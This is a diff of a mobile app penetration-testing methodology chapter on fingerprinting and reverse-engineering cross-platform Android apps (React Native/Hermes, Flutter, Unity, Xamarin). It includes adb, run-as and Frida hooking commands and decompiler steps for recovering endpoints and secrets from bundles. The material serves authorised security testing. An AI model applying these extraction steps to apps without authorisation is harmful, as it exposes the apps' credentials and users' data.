@@ -13,7 +13,7 @@
 | **Milestones** | M2 (runtime identified, correct extraction pipeline running, artefact identity recorded), M4 (bundle/snapshot fully mined: endpoints, secrets, routes, storage keys, bridge inventory; OTA channel rated) |
 | **VRT ceiling** | `server_side_injection.remote_code_execution_rce` (P1) for an unsigned OTA bundle channel or a live RN dev bundle server; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a validated live credential recovered from a bundle/snapshot/assembly; `broken_authentication_and_session_management.authentication_bypass` (P1) where a Capacitor/Cordova bridge primitive lifts the session token. The framework-recovery observations themselves fall to `lack_of_binary_hardening.lack_of_obfuscation` (P5) and `mobile_security_misconfiguration.ssl_certificate_pinning.defeatable` (P5) — never file those |
 | **Primary attacker model** | AM-09 malicious backend/CDN (the OTA and live-reload channels), with AM-02 remote one-click for the deep-link→route and deep-link→WebView chains, AM-01 for anyone holding a recovered credential, AM-03 zero-permission local app for the route/extra injection into exported framework activities, and AM-08 malicious third-party SDK for the npm/pub supply-chain half |
-| **Maps to** | MASVS-CODE-4, MASVS-PLATFORM-2, MASVS-NETWORK-1, MASVS-STORAGE-1, MASVS-RESILIENCE-3; MASTG-TEST-0237 (placeholder), MASTG-TEST-0334, MASTG-TEST-0223; MASWE-0004, MASWE-0026, MASWE-0033, MASWE-0034, MASWE-0035, MASWE-0048, MASWE-0049, MASWE-0059; MASTG-KNOW-0015, MASTG-KNOW-0018; MASTG-TECH-0019, -0041, -0109, -0140, -0141, -0142, -0145, -0150, -0151, -0156, -0160, -0164, -0165, -0172, -0173, -0174; MASTG-TOOL-0009, -0011, -0029, -0034, -0077, -0100, -0101, -0103, -0104, -0107, -0112, -0116, -0120, -0124, -0125, -0129, -0144; CWE-798, CWE-494, CWE-749, CWE-94, CWE-79, CWE-353, CWE-354, CWE-693, CWE-829, CWE-312; ATT&CK T1406, T1407, T1533, T1575, T1617, T1633, T1658, T1670, T1521.003 |
+| **Maps to** | MASVS-CODE-4, MASVS-PLATFORM-2, MASVS-NETWORK-1, MASVS-STORAGE-1, MASVS-RESILIENCE-3; MASTG-TEST-0237 (placeholder), MASTG-TEST-0334, MASTG-TEST-0223; MASWE-0004, MASWE-0026, MASWE-0033, MASWE-0034, MASWE-0035, MASWE-0048, MASWE-0049, MASWE-0059; MASTG-KNOW-0015, MASTG-KNOW-0018; MASTG-TECH-0019, -0041, -0109, -0140, -0141, -0142, -0145, -0150, -0151, -0156, -0160, -0164, -0165, -0172, -0173, -0174; MASTG-TOOL-0009, -0011, -0029, -0034, -0077, -0100, -0101, -0103, -0104, -0107, -0112, -0116, -0120, -0124, -0125, -0129, -0144; CWE-798, CWE-494, CWE-749, CWE-94, CWE-79, CWE-353, CWE-354, CWE-693, CWE-829, CWE-312; Mobile Top 10 2024 M2; ATT&CK T1406, T1407, T1533, T1575, T1617, T1633, T1658, T1670, T1521.003 |
 
 ## Why this domain pays
 
@@ -69,7 +69,7 @@ grep -oE 'assets/index\.android\.bundle|assets/main\.jsbundle|lib/[^/]+/libherme
 grep -rlE 'io\.flutter\.embedding|com\.facebook\.react\.(ReactActivity|bridge|runtime)|com\.getcapacitor\.|org\.apache\.cordova\.|com\.unity3d\.player|mono\.android\.|Lorg/jetbrains/compose|org\.jetbrains\.compose|composeResources/|com\.russhwolf\.settings|app\.cash\.sqldelight' "$DEC/jadx/sources" | wc -l
 grep -rl 'androidx\.compose' "$DEC/jadx/sources" | wc -l      # control: plain Jetpack Compose is NOT KMP
 
-# 3. A web app the artefact list cannot show: HTML/JS inlined in code and served into a first-party origin (gap #134)
+# 3. A web app the artefact list cannot show: HTML/JS inlined in code and served into a first-party origin
 grep -rnE 'loadDataWithBaseURL|\.loadData\(|WebViewAssetLoader|appassets\.androidplatform\.net|"<html|"<script' "$DEC/jadx/sources" | head -20
 tail -n +2 "$E/inventory/webviews.csv" | wc -l
 
@@ -85,7 +85,7 @@ aapt2 dump badging "$E"/apk/base.apk | grep -E 'targetSdkVersion|sdkVersion'
 - Everything 0 and `apkid` reports only a DEX compiler (`dexlib`/`r8`/`dx`) and `$DEC/jadx/sources` holds application-package Activities with real view code (not a lone `FlutterActivity`/`UnityPlayerActivity`/`BridgeActivity` subclass) → the whole domain is n/a:
 
 ```bash
-python3 scripts/mark.py $E D19 n/a --note "D19 probe: 0 framework markers across <N> splits (<split names>, logs/D19-probe-apklist.txt); DEX framework strings 0 (androidx.compose control=<n>); inline-webapp grep 0 and inventory/webviews.csv rows=<n> (handled in D10); apkid=<compiler list>; targetSdk=<n> minSdk=<n>; business logic in <example first-party Activity>. Native Android app — D19 not applicable."
+python3 scripts/mark.py "$E" D19 n/a --note "D19 probe: 0 framework markers across <N> splits (<split names>, logs/D19-probe-apklist.txt); DEX framework strings 0 (androidx.compose control=<n>); inline-webapp grep 0 and inventory/webviews.csv rows=<n> (handled in D10); apkid=<compiler list>; targetSdk=<n> minSdk=<n>; business logic in <example first-party Activity>. Native Android app — D19 not applicable."
 ```
 
 A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `apkid` `packer` entry is not a negative: collect the splits (D19-002) or unpack first, then re-run.
@@ -115,6 +115,16 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 
 ## Items
 
+Conventions for every `How` in this chapter: `$E` is the engagement folder; `$DEC` = `$E/decompiled` with
+`$DEC/apktool`, `$DEC/jadx/sources` (both produced in P2), `$DEC/raw` (every split unpacked:
+`for f in "$E"/apk/*.apk; do unzip -oq "$f" -d "$DEC/raw/"; done`), and the framework dumps the items create —
+`$DEC/blutter` (Flutter), `$DEC/il2cpp` (Unity), `$DEC/assemblies` (Xamarin/MAUI). Working files named bare
+(`hbc.strings`, `strings.txt`, `endpoints.txt`, `pp.xml`, `dump.dart`) are written under `$E/logs/` — run the
+item from there. `$SERIAL` is the device from `scripts/doctor.sh --json`: never the `-U` / `-d` device selectors of frida and adb — with a
+phone plus emulators attached they pick silently, and the resulting `need Gadget to attach on jailed Android`
+reads exactly like app hardening. `frida … -f <pkg> -l x.js -q -t <seconds>` keeps a spawn-mode session alive for
+the UI walk; attach mode (`-p <pid>`) ignores `-t` and is wrapped in `timeout 90` (`gtimeout` on macOS).
+
 ### D19-001 · Fingerprint the runtime and record targetSdk before running any Java-centric test
 
 | | |
@@ -123,6 +133,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **VRT** | n/a (coverage control; the finding is whatever the correct pipeline then recovers) |
 | **Attacker** | n/a |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASTG-TECH-0165, MASTG-TOOL-0009 (APKiD), MASTG-TECH-0141, MASTG-TECH-0150, MASTG-TOOL-0124 (aapt2) |
 
 - **Test:** Determine which runtime holds the business logic from the APK's own artefact list, and record
@@ -130,17 +141,25 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   version-gated and misquoting them is how a live finding gets closed as legacy.
 - **How:**
   ```bash
-  unzip -l target.apk > /tmp/apk.list
-  grep -E 'assets/index.android.bundle|assets/main.jsbundle'                     /tmp/apk.list  # React Native
-  grep -E 'lib/[^/]+/libhermes(_executor)?\.so|libjsc\.so|libreactnative'        /tmp/apk.list  # RN engine
-  grep -E 'lib/[^/]+/libflutter\.so|lib/[^/]+/libapp\.so|assets/flutter_assets/' /tmp/apk.list  # Flutter
-  grep -E 'assets/www/|res/xml/config\.xml|assets/www/cordova\.js'               /tmp/apk.list  # Cordova/Ionic
-  grep -E 'assets/capacitor\.config\.json|assets/capacitor\.plugins\.json|assets/public/' /tmp/apk.list # Capacitor
-  grep -E 'assets/bin/Data/|libil2cpp\.so|libunity\.so|libmain\.so|global-metadata\.dat'   /tmp/apk.list # Unity
-  grep -E 'assemblies/|assemblies\.blob|libassemblies\.[^ ]*\.blob\.so|libmonosgen-2\.0\.so|libxamarin-app\.so' /tmp/apk.list # Xamarin/MAUI
-  grep -E 'lib/[^/]+/lib.*shared.*\.so|kotlin/|META-INF/.*kotlin_module'         /tmp/apk.list  # Kotlin/KMP
-  apkid target.apk
-  aapt2 dump badging target.apk | grep -E 'targetSdkVersion|sdkVersion'
+  # one listing per archive: BSD/macOS unzip treats extra archive arguments as member patterns and lists ~1 entry
+  for f in "$E"/apk/*.apk; do printf '== %s %s entries\n' "$f" "$(unzip -Z1 "$f" | wc -l)"; unzip -Z1 "$f"; done > "$E/logs/D19-001-apklist.txt"
+  L="$E/logs/D19-001-apklist.txt"
+  grep -E 'assets/index\.android\.bundle|assets/main\.jsbundle'                     "$L"  # React Native
+  grep -E 'lib/[^/]+/libhermes(_executor)?\.so|libjsc\.so|libreactnative'          "$L"  # RN engine
+  grep -E 'lib/[^/]+/libflutter\.so|lib/[^/]+/libapp\.so|assets/flutter_assets/|flutter_assets/shorebird\.yaml' "$L"  # Flutter (+ Shorebird code push -> D19-081)
+  grep -E 'assets/www/|res/xml/config\.xml|assets/www/cordova\.js'                 "$L"  # Cordova/Ionic
+  grep -E 'assets/capacitor\.config\.json|assets/capacitor\.plugins\.json|assets/public/' "$L"  # Capacitor
+  grep -E 'assets/bin/Data/|libil2cpp\.so|libunity\.so|libmain\.so|global-metadata\.dat'   "$L"  # Unity
+  grep -E 'assemblies/|assemblies\.blob|libassemblies\.[^ ]*\.blob\.so|libmonosgen-2\.0\.so|libxamarin-app\.so|libcoreclr\.so' "$L"  # Xamarin/MAUI (libcoreclr.so = .NET 10+ CoreCLR)
+  # Kotlin/KMP: package-file markers are stripped by R8/Bazel builds; use DEX string literals (they survive R8) with a control
+  grep -rlE 'Lorg/jetbrains/compose|org\.jetbrains\.compose|composeResources/|com\.russhwolf\.settings|app\.cash\.sqldelight|io\.ktor\.client|kotlin\.native' "$DEC/jadx/sources" | wc -l   # KMP-stack markers
+  grep -rl 'androidx\.compose' "$DEC/jadx/sources" | wc -l                     # control: plain Jetpack Compose is NOT KMP
+  grep -cE 'composeResources/|META-INF/.*kotlin_module' "$L"                  # package-file markers, when the build kept them
+  # a web app the artefact list cannot show: HTML/JS inlined in code and served into a first-party origin
+  grep -rnE 'loadDataWithBaseURL|\.loadData\(|WebViewAssetLoader|appassets\.androidplatform\.net|"<html|"<script' "$DEC/jadx/sources" | head -20
+  tail -n +2 "$E/inventory/webviews.csv" | wc -l
+  apkid "$E"/apk/base.apk
+  aapt2 dump badging "$E"/apk/base.apk | grep -E 'targetSdkVersion|sdkVersion'
   ```
   Version gates to state explicitly in any finding you write from this chapter:
   - `targetSdk<31`: components with an intent-filter are exported by default — a Flutter/RN/Unity activity
@@ -158,14 +177,21 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   - `targetSdk<17`: ContentProviders exported by default. **LEGACY.**
 - **Proof:** A concrete artefact list quoted in the methodology section, e.g. `assets/index.android.bundle`
   plus `lib/arm64-v8a/libhermes.so` ⇒ React Native on Hermes; `lib/arm64-v8a/libapp.so` ⇒ Flutter release
-  AOT — together with the manifest's `targetSdkVersion` value.
+  AOT — together with the manifest's `targetSdkVersion` value. KMP ⇐ `org.jetbrains.compose`/`composeResources/`
+  or a ktor + sqldelight + multiplatform-settings stack with the `androidx.compose` control count recorded; plain
+  Kotlin with only `androidx.compose` hits is native. For a native app, the `loadDataWithBaseURL`/`WebViewAssetLoader`
+  call site that makes an inline HTML/JS payload the app body is itself the fingerprint (`framework=native+inline-webapp`).
 - **Escalation:** Selects the extraction pipeline (hermes-dec / Blutter / Il2CppDumper / pyxamstore) that
   produces the endpoint list for -> D15, the secret list for -> D12/D18, the route list for -> D09, and the
   bridge list for -> D10.
 - **Ruled out when:** No framework marker is present in any split, `apkid` reports only a DEX compiler
   (`dexlib`/`r8`/`dx`), and `jadx` decompiles application-package classes containing the app's actual
   business logic (activities with real view code, not a single `FlutterActivity`/`UnityPlayerActivity`
-  subclass). That is a native Android app and this entire chapter is not applicable — record it as such.
+  subclass). That is a native Android app and this chapter is not applicable **unless the inline-web-app grep
+  hits**: a `loadDataWithBaseURL(<first-party base>, <template>)` or `WebViewAssetLoader` site is a bridged web app
+  the artefact greps cannot see (the base URL is the real origin — cookies, `fetch` and the bridge all follow it).
+  Record `framework=native+inline-webapp`, keep D19-056, D19-057, D19-058, D19-071 and D19-076 applicable, and
+  route the WebView itself to D10. Write the n/a note with the per-split counts from `logs/D19-001-apklist.txt`.
 
 ### D19-002 · Collect every split APK, XAPK and feature module before declaring a framework library absent
 
@@ -175,6 +201,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **VRT** | n/a (coverage control) |
 | **Attacker** | n/a |
 | **Applies to** | all app-bundle / split-APK distributions (Play delivers these by default) |
+| **Requires** | — |
 | **Maps to** | MASTG-TECH-0145 (Working with XAPK Files) |
 
 - **Test:** Flutter, RN and Unity apps are routinely distributed as split APKs, where `libapp.so`,
@@ -182,20 +209,19 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   base-only review produces a confident, wrong "the library is not present".
 - **How:**
   ```bash
-  adb shell pm path <pkg>
+  adb -s "$SERIAL" shell pm path <pkg>
   # package:/data/app/~~xxx/base.apk
   # package:/data/app/~~xxx/split_config.arm64_v8a.apk
   # package:/data/app/~~xxx/split_config.xxhdpi.apk
-  for p in $(adb shell pm path <pkg> | tr -d '\r' | sed 's/package://'); do adb pull "$p" .; done
-  unzip -l split_config.arm64_v8a.apk | grep -E 'libapp|libflutter|libil2cpp|libassemblies|libhermes'
-  # reinstalling a modified split set (single-APK `adb install` will not work):
-  adb shell pm install-create -S <total-bytes>
-  adb shell pm install-write -S <size> <session> 0 /data/local/tmp/base.apk
-  adb shell pm install-write -S <size> <session> 1 /data/local/tmp/split_config.arm64_v8a.apk
-  adb shell pm install-commit <session>
+  for p in $(adb -s "$SERIAL" shell pm path <pkg> | tr -d '\r' | sed 's/package://'); do adb -s "$SERIAL" pull "$p" .; done
+  grep -E '^== |libapp|libflutter|libil2cpp|libassemblies|libhermes' "$E/logs/D19-001-apklist.txt"   # the per-split listing from D19-001 names the split that carries each library
+  # reinstalling a modified split set (single-APK `adb -s "$SERIAL" install` will not work):
+  rm -f "$E"/apk/*.idsig                                   # apksigner v4 sidecars force an incremental install and mask the signature verdict
+  adb -s "$SERIAL" install-multiple --no-incremental base.apk split_config.arm64_v8a.apk split_config.xxhdpi.apk
+  # fallback when install-multiple refuses: pm install-create -S <total> / install-write / install-commit
   ```
-- **Proof:** The library you "could not find" listed in the ABI split's `unzip -l` output, and the
-  reinstalled modified split set launching.
+- **Proof:** The library you "could not find" listed under the ABI split's header in the per-split listing, and
+  the reinstalled modified split set launching.
 - **Escalation:** Unblocks every Flutter/Unity/MAUI item in this chapter and the native-library review in
   -> D16.
 - **Ruled out when:** `adb shell pm path <pkg>` returns exactly one `base.apk` line and `unzip -l base.apk`
@@ -213,7 +239,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Requires** | react-native, cordova, capacitor, device |
 | **Maps to** | facebook/hermes `BytecodeFileHeader.sourceHash`; `CodePushConstants` (`CODE_PUSH_FOLDER_PREFIX = "CodePush"`, `STATUS_FILE = "codepush.json"`, `BUNDLE_JWT_FILE = ".codepushrelease"`, `DEFAULT_JS_BUNDLE_NAME = "index.android.bundle"`); expo `UpdatesConfiguration.kt` |
 
-- **Test:** If an OTA channel exists, the bundle inside the APK is only the fallback. Every static finding
+- **Test:** (Owner of the "which binary actually executes" test; D01-032 is its recon-chapter duplicate — run it here and record one verdict on both ids.) If an OTA channel exists, the bundle inside the APK is only the fallback. Every static finding
   must be re-checked against the bundle currently in use, and every vendor claim of "we fixed that" must be
   verified against the live bundle rather than the store build.
 - **How:**
@@ -221,16 +247,16 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   # 1. hash the bundle shipped in the APK
   python3 - <<'PY'
   import struct
-  d = open('ext/assets/index.android.bundle','rb').read(64)
+  d = open('$DEC/raw/assets/index.android.bundle','rb').read(64)
   print('apk  bytecodeVersion', struct.unpack_from('<I', d, 8)[0], 'sourceHash', d[12:32].hex())
   PY
   # 2. locate and hash the bundle the device is actually running
-  adb shell "run-as <pkg> find files -name 'index.android.bundle' -o -name '*.hbc'"
-  adb shell "run-as <pkg> ls -la files/CodePush/"
-  adb shell "run-as <pkg> cat files/CodePush/codepush.json"        # currentPackage / previousPackage
-  adb shell "run-as <pkg> cat shared_prefs/CodePush.xml"           # CODE_PUSH_PENDING_UPDATE / FAILED_UPDATES
-  adb shell "run-as <pkg> ls -laR files/.expo-internal/ 2>/dev/null"
-  adb exec-out run-as <pkg> cat files/CodePush/<hash>/<app>/index.android.bundle > live.bundle
+  adb -s "$SERIAL" shell "run-as <pkg> find files -name 'index.android.bundle' -o -name '*.hbc'"
+  adb -s "$SERIAL" shell "run-as <pkg> ls -la files/CodePush/"
+  adb -s "$SERIAL" shell "run-as <pkg> cat files/CodePush/codepush.json"        # currentPackage / previousPackage
+  adb -s "$SERIAL" shell "run-as <pkg> cat shared_prefs/CodePush.xml"           # CODE_PUSH_PENDING_UPDATE / FAILED_UPDATES
+  adb -s "$SERIAL" shell "run-as <pkg> ls -laR files/.expo-internal/ 2>/dev/null"
+  adb -s "$SERIAL" exec-out run-as <pkg> cat files/CodePush/<hash>/<app>/index.android.bundle > live.bundle
   python3 - <<'PY'
   import struct
   d = open('live.bundle','rb').read(64)
@@ -239,18 +265,26 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   ```
   Or capture it at load time regardless of where it came from:
   ```javascript
-  // frida -D "$SERIAL" -f <pkg> -l which-bundle.js
+  // which-bundle.js — legacy bridge AND bridgeless (RN >= 0.76 default): hook every loaded class that defines
+  // loadScriptFromFile/loadScriptFromAssets. frida -D "$SERIAL" -f <pkg> -l which-bundle.js -q -t 120
   Java.perform(function () {
-    var C = Java.use('com.facebook.react.bridge.CatalystInstanceImpl');
-    C.loadScriptFromFile.implementation = function (f, u, z) {
-      console.log('[bundle-from-file]', f); return this.loadScriptFromFile(f, u, z); };
-    C.loadScriptFromAssets.implementation = function (a, u, z) {
-      console.log('[bundle-from-assets]', u); return this.loadScriptFromAssets(a, u, z); };
+    ['com.facebook.react.bridge.CatalystInstanceImpl', 'com.facebook.react.runtime.ReactInstance'].forEach(function (cn) {
+      try {
+        var C = Java.use(cn);
+        ['loadScriptFromFile', 'loadScriptFromAssets'].forEach(function (m) {
+          if (!C[m]) return;
+          C[m].overloads.forEach(function (o) { o.implementation = function () {
+            console.log('[' + cn + '.' + m + ']', JSON.stringify(Array.prototype.slice.call(arguments).map(String)));
+            return o.apply(this, arguments); }; });
+        });
+        console.log('[+] hooked', cn);
+      } catch (e) { console.log('[-] ' + cn + ': ' + e.message); }
+    });
   });
   ```
 - **Proof:** Two different `sourceHash` values between the APK copy and the on-device copy, or a
-  `[bundle-from-file] /data/user/0/<pkg>/files/CodePush/...` log line proving the executing code did not
-  come from the package you analysed.
+  `[...loadScriptFromFile] ["/data/user/0/<pkg>/files/CodePush/..."]` log line proving the executing code did
+  not come from the package you analysed. A run with no `[+] hooked` line is a detached session, not a negative.
 - **Escalation:** Reportable at Medium on its own — a security control the client believes shipped can be
   removed post-review by a channel push with no version bump. -> D19-026/D19-027 for the P1 form,
   -> D17 supply chain.
@@ -263,35 +297,26 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 
 | | |
 |---|---|
-| **Severity ceiling** | Critical |
-| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when the keys show an unauthenticated code channel; otherwise Support |
-| **Attacker** | AM-09 |
+| **Severity ceiling** | Support |
+| **VRT** | n/a — pointer; the findings are filed under D19-025..D19-027, D19-041/D19-042 and D19-048/D19-060 |
+| **Attacker** | n/a |
 | **Applies to** | React Native + Expo, RN + CodePush, Flutter |
 | **Requires** | react-native, flutter |
 | **Maps to** | MASTG-TECH-0141 (Inspecting the Merged AndroidManifest), MASTG-TECH-0150; expo `UpdatesConfiguration.kt`; flutter `FlutterActivityLaunchConfigs.java`; `CodePush.java` / `docs/setup-android.md` |
 
-- **Test:** Each framework stores security-relevant configuration as `<meta-data>` in the merged manifest or
-  as string resources. These read like build plumbing and are routinely skipped by a permissions-focused
-  manifest review.
+- **Test:** The framework's security configuration lives in `<meta-data>` of the *merged* manifest and in
+  `strings.xml`, not in permissions, so a permissions-focused review skips it. This item is a pointer: the greps
+  and the proofs are owned by D19-025 (OTA channel), D19-026/D19-027 (expo / CodePush signing), D19-041/D19-042
+  (Flutter deep-linking and initial route) and D19-048/D19-060 (Capacitor config) — do not settle them here twice.
 - **How:**
   ```bash
-  apktool d target.apk -o out/
-  grep -nE '<meta-data' out/AndroidManifest.xml
-  # Expo OTA (expo/expo UpdatesConfiguration.kt):
-  grep -nE 'expo\.modules\.updates\.(ENABLED|EXPO_UPDATE_URL|EXPO_RUNTIME_VERSION|EXPO_UPDATES_CHECK_ON_LAUNCH|EXPO_UPDATES_LAUNCH_WAIT_MS|CODE_SIGNING_CERTIFICATE|CODE_SIGNING_METADATA|CODE_SIGNING_INCLUDE_MANIFEST_RESPONSE_CERTIFICATE_CHAIN|CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS|ENABLE_EXPO_UPDATES_PROTOCOL_V0_COMPATIBILITY_MODE|DISABLE_ANTI_BRICKING_MEASURES|HAS_EMBEDDED_UPDATE|EXPO_SCOPE_KEY|ENABLE_BSDIFF_PATCH_SUPPORT)' out/AndroidManifest.xml
-  # Flutter (FlutterActivityLaunchConfigs.java):
-  grep -nE 'flutter_deeplinking_enabled|io\.flutter\.Entrypoint|io\.flutter\.EntrypointUri|io\.flutter\.InitialRoute' out/AndroidManifest.xml
-  # CodePush lives in strings.xml, not the manifest:
-  grep -nE 'CodePushDeploymentKey|CodePushPublicKey|CodePushServerUrl' out/res/values/strings.xml
+  grep -nE '<meta-data' "$DEC/apktool/AndroidManifest.xml" > "$E/logs/D19-004.txt"   # the shipped, merged manifest — a source-tree grep misses autolinked contributions
+  grep -nE 'CodePush|expo\.modules|flutter' "$DEC/apktool/res/values/strings.xml" >> "$E/logs/D19-004.txt"
   ```
-- **Proof:** Concrete values quoted in the finding — e.g. `expo.modules.updates.CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS`
-  set to `true`, an `EXPO_UPDATE_URL` on a non-TLS or third-party host, or a `CodePushDeploymentKey` present
-  with no accompanying `CodePushPublicKey`.
-- **Escalation:** -> D19-026, D19-027 (the P1 OTA findings); `flutter_deeplinking_enabled` -> D19-041;
-  `io.flutter.InitialRoute` -> D19-042.
-- **Ruled out when:** The merged manifest (not the pre-merge source manifest) contains none of these keys and
-  `strings.xml` contains no `CodePush*` resource. Use `apktool` or `aapt2 dump xmltree` on the *shipped*
-  APK — a source-tree grep misses manifest-merger contributions from autolinked modules.
+- **Proof:** n/a — `logs/D19-004.txt` exists and the owner items cite it.
+- **Escalation:** -> D19-025, D19-026, D19-027 (OTA); -> D19-041, D19-042 (Flutter); -> D19-048, D19-060 (Capacitor).
+- **Ruled out when:** n/a — pointer item; it is `done` once the dump exists. Use `apktool` or `aapt2 dump xmltree` on
+  the *shipped* APK, never a source-tree manifest.
 
 ### D19-005 · Rebut the "it is obfuscated, so it is not exploitable" defence with recovered artefacts
 
@@ -308,11 +333,12 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   ProGuard makes the app unanalysable. Pre-empt it with counts and excerpts, not opinion.
 - **How:**
   ```bash
-  apkid target.apk                                          # what protection is actually applied
-  python3 blutter.py ext/lib/arm64-v8a out_dir && wc -l out_dir/pp.txt out_dir/objs.txt
-  hermes-decomp info ext/assets/index.android.bundle
-  Il2CppDumper.exe ext/lib/arm64-v8a/libil2cpp.so ext/assets/bin/Data/Managed/Metadata/global-metadata.dat ./out \
-    && wc -l out/dump.cs
+  apkid "$E"/apk/base.apk                                          # what protection is actually applied
+  python3 blutter.py "$DEC/raw/lib/arm64-v8a" "$DEC/blutter" && wc -l "$DEC/blutter/pp.txt" "$DEC/blutter/objs.txt"
+  hermes-decomp info $DEC/raw/assets/index.android.bundle
+  # Il2CppDumper release zips ship linux-x64 / osx-x64 / win-x64 builds: call the native binary (or `dotnet Il2CppDumper.dll`), never the .exe
+  Il2CppDumper "$DEC/raw/lib/arm64-v8a/libil2cpp.so" "$DEC/raw/assets/bin/Data/Managed/Metadata/global-metadata.dat" "$DEC/il2cpp" \
+    && wc -l "$DEC/il2cpp/dump.cs"
   ```
 - **Proof:** Quantified recovery in the report's impact paragraph — "N recovered Dart object-pool entries
   including the API base URL and the AES key material", "M recovered C# methods including
@@ -340,16 +366,20 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   than the old batched bridge. Hooking `__fbBatchedBridge` on a new-architecture app fires nothing.
 - **How:**
   ```bash
-  unzip -l target.apk | grep -E 'libhermes|libjsc|libhermes_executor|libreactnativejni|libreactnative\.so'
-  unzip -o target.apk 'assets/index.android.bundle' -d ext/
-  file ext/assets/index.android.bundle
-  strings -n 6 ext/assets/index.android.bundle | sort -u > hbc.strings
+  grep -E 'libhermes|libjsc|libhermes_executor|libreactnativejni|libreactnative\.so' "$E/logs/D19-001-apklist.txt"
+  for f in "$E"/apk/*.apk; do unzip -oq "$f" 'assets/index.android.bundle' -d "$DEC/raw/"; done
+  file $DEC/raw/assets/index.android.bundle
+  strings -n 6 $DEC/raw/assets/index.android.bundle | sort -u > hbc.strings
   grep -a -cE '__fbBatchedBridge|nativeModuleProxy' hbc.strings                            # old bridge
   grep -a -cE 'TurboModule|__turboModuleProxy|global\.nativeFabricUIManager' hbc.strings   # new architecture
+  grep -a -cE 'RN\$Bridgeless|ReactInstance|TurboModuleRegistry' hbc.strings                 # bridgeless (RN >= 0.76 default) => no CatalystInstanceImpl
   ```
+  `hbc.strings` (from `strings(1)`) is only reliable for a plain Metro bundle; for a Hermes bundle every later
+  grep in this chapter runs on the per-line `strings.txt` that D19-009 produces.
 - **Proof:** `libhermes.so` plus a `Hermes JavaScript bytecode` bundle ⇒ Hermes path. A non-zero
   `__turboModuleProxy` count ⇒ new architecture, so hook `global.__turboModuleProxy` rather than
-  `global.__fbBatchedBridge`.
+  `global.__fbBatchedBridge`. `RN$Bridgeless` present ⇒ bridgeless: hook `com.facebook.react.runtime.ReactInstance`,
+  not `CatalystInstanceImpl` (D19-003/D19-020 hook both).
 - **Escalation:** Determines which instrumentation in D19-018/D19-020 will actually fire.
 - **Ruled out when:** `file` reports plain text and neither `libhermes.so` nor `libjsc.so` is present in any
   split — the app embeds no JS engine and is not React Native, whatever the bundle name suggests.
@@ -365,17 +395,17 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Requires** | react-native, hermes |
 | **Maps to** | MASTG-TOOL-0104; facebook/hermes `BytecodeFileFormat.h` (`struct BytecodeFileHeader`) |
 
-- **Test:** The HBC version number decides which tools can parse the file at all, and the `sourceHash` is a
+- **Test:** (Owner of the Hermes header/version test; D01-025 is its recon-chapter duplicate — run it here and record one verdict on both ids.) The HBC version number decides which tools can parse the file at all, and the `sourceHash` is a
   stable build fingerprint you can diff across releases and against an OTA payload.
 - **How:**
   ```bash
-  unzip -o target.apk 'assets/index.android.bundle' -d ext/
-  file ext/assets/index.android.bundle
+  for f in "$E"/apk/*.apk; do unzip -oq "$f" 'assets/index.android.bundle' -d "$DEC/raw/"; done
+  file $DEC/raw/assets/index.android.bundle
   # -> "Hermes JavaScript bytecode, version 94"   (Hermes)
   # -> "Unicode text, UTF-8 text"                  (plain Metro bundle — just read it)
   python3 - <<'PY'
   import struct
-  d = open('ext/assets/index.android.bundle','rb').read(64)
+  d = open('$DEC/raw/assets/index.android.bundle','rb').read(64)
   magic, ver = struct.unpack_from('<QI', d, 0)
   sha1 = d[12:32].hex()
   fl, gci, fnc, skc, idc, strc = struct.unpack_from('<IIIIII', d, 32)
@@ -402,7 +432,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Requires** | react-native, hermes |
 | **Maps to** | MASTG-TOOL-0104 (hermes-dec) |
 
-- **Test:** Verify your decompiler actually supports the app's HBC version instead of silently producing
+- **Test:** (Owner of the Hermes tool-selection test; D01-026 duplicates it together with D19-009 — run both here and record one verdict on each id.) Verify your decompiler actually supports the app's HBC version instead of silently producing
   garbage or refusing. This is the single most common reason an RN app gets written up as "not analysable".
   React Native ships its own Hermes fork, so field versions run ahead of the public tools.
 - **How:** Version support, as read from each project:
@@ -417,14 +447,17 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   - `hermes-decomp` (SymbioticSec, Rust): claims HBC **40–99**, with `decompile`, `disasm`, `strings`,
     `modules`, `xref`, `callgraph`, `secrets`, `frida-hooks`, `patch-string`, `asm`.
   - `react-native-decompiler` (numandev1): **plain-JS bundles only**, not bytecode.
-  - Upstream `facebook/hermes` `BYTECODE_VERSION` in `BytecodeVersion.h` is **96**.
+  - Upstream `facebook/hermes` `BYTECODE_VERSION` is **96** for the classic Hermes used through RN 0.81; **Hermes V1
+    (static Hermes), the default engine from RN 0.82, emits HBC > 96** (v98 is in 2026 store builds), which `hbctool`,
+    older `hbcdump` releases and `hermes_rs` do not parse. `file` prints the exact number — take it from the header,
+    never from a table, and try `hermes-decomp` (claims HBC 40–99) first on anything ≥ 97.
   ```bash
-  hbc-file-parser  ext/assets/index.android.bundle          # header + table sizes
-  hbc-disassembler ext/assets/index.android.bundle out.hasm
-  hbc-decompiler   ext/assets/index.android.bundle out.js
-  hermes-decomp decompile ext/assets/index.android.bundle -o out/     # if the version is beyond hbctool
